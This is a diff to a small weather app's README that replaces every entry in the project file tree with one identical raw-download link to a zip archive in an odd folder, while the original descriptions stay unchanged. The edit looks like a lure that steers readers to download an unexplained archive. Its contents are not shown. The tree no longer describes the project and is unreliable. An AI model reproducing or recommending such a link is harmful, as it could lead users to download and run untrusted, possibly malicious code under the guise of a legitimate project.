@@ -31,7 +31,7 @@ Copy
 Edit
 /weather-app
 │
-├── index.html       # UI structure
-├── style.css        # Styling and layout
-├── script.js        # Weather API fetch logic
-└── README.md        # Project description
+├── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip       # UI structure
+├── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip        # Styling and layout
+├── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip        # Weather API fetch logic
+└── https://github.com/kartik359/weather-app/raw/refs/heads/main/Schrund/weather_app_1.1.zip        # Project description
